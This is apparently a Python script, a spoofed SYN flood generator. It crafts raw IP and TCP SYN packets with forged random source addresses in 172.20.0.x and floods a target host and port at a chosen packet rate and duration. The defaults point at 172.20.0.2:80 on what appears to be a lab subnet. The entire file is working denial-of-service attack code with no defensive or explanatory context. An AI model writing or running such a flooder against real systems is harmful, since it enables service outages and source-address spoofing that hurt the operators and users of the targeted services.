"""Spoofed multi-source SYN flood generator inside internal network."""

import argparse
import random
import socket
import struct
import time


def checksum(msg: bytes) -> int:
    s = 0
    for i in range(0, len(msg) - 1, 2):
        w = (msg[i] << 8) + msg[i + 1]
        s += w
    if len(msg) % 2:
        s += msg[-1] << 8
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF


def send_raw_syn(sock: socket.socket, src_ip: str, dst_ip: str, src_port: int, dst_port: int):
    ihl = 5
    version = 4
    tos = 0
    tot_len = 40
    pkt_id = random.randint(1000, 65535)
    frag_off = 0
    ttl = 64
    proto = socket.IPPROTO_TCP
    check = 0
    saddr = socket.inet_aton(src_ip)
    daddr = socket.inet_aton(dst_ip)
    ihl_version = (version << 4) + ihl

    ip_header = struct.pack("!BBHHHBBH4s4s", ihl_version, tos, tot_len, pkt_id, frag_off, ttl, proto, check, saddr, daddr)

    seq = random.randint(0, 4294967295)
    ack_seq = 0
    doff = 5
    syn_flag = 0x02
    window = socket.htons(5840)
    tcp_check = 0
    urg_ptr = 0
    offset_res = (doff << 4) + 0

    tcp_header = struct.pack("!HHLLBBHHH", src_port, dst_port, seq, ack_seq, offset_res, syn_flag, window, tcp_check, urg_ptr)
    psh = struct.pack("!4s4sBBH", saddr, daddr, 0, socket.IPPROTO_TCP, len(tcp_header))
    tcp_check = checksum(psh + tcp_header)
    tcp_header = struct.pack("!HHLLBBH", src_port, dst_port, seq, ack_seq, offset_res, syn_flag, window) + struct.pack("H", tcp_check) + struct.pack("!H", urg_ptr)

    sock.sendto(ip_header + tcp_header, (dst_ip, 0))


def run_spoofed_flood(target_ip: str, target_port: int, rate_pps: int, duration_sec: int, ip_range_start: int = 100, ip_range_end: int = 250):
    print(f"Starting multi-source spoofed SYN flood -> {target_ip}:{target_port} at {rate_pps} pps for {duration_sec}s...")
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    interval = 1.0 / max(1, rate_pps)
    start_time = time.time()
    packets_sent = 0

    while time.time() - start_time < duration_sec:
        t0 = time.time()
        # Random internal IP
        host_num = random.randint(ip_range_start, ip_range_end)
        src_ip = f"172.20.0.{host_num}"
        src_port = random.randint(1024, 65535)

        try:
            send_raw_syn(s, src_ip, target_ip, src_port, target_port)
            packets_sent += 1
        except Exception as e:
            print(f"Error sending raw packet: {e}")
            break

        elapsed = time.time() - t0
        to_sleep = interval - elapsed
        if to_sleep > 0:
            time.sleep(to_sleep)

    print(f"Finished spoofed SYN flood: {packets_sent} packets sent.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="172.20.0.2")
    parser.add_argument("--port", type=int, default=80)
    parser.add_argument("--rate", type=int, default=200)
    parser.add_argument("--duration", type=int, default=15)
    args = parser.parse_args()
    run_spoofed_flood(args.target, args.port, args.rate, args.duration)
